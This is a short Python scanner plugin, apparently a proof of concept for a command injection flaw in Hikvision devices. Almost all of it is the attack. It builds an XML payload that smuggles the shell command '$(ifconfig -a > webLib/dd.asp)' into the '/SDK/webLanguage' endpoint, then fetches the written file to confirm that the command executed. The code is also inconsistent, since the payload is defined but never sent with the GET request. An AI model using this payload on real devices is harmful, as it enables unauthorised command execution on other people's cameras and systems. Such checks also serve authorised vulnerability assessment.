#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  '',

      'method'    :   'put',

      'bugname'   :   '海康威视多产品存在命令注入',

      'level'     :   'high',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = '/SDK/webLanguage'
  data = '''
<?xml version="1.0"
encoding="UTF-8"?><language>$(ifconfig -a >
webLib/dd.asp)</language>

  '''
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 500 and "/SDK/webLanguage" in res.text:
      res.close()
      resp = requests.get(url=url+'/dd.asp',headers=headers,timeout=5)
      if resp.status_code == 200 and re.search(r'addr.*?Bcast.*?Mask.*?inet6.*?addr',resp.text,re.S):
        ret['huixian'] = resp.text
        resp.close()
        return ret
      else:
        return ret
    else:
      return ret
  except:
    return ret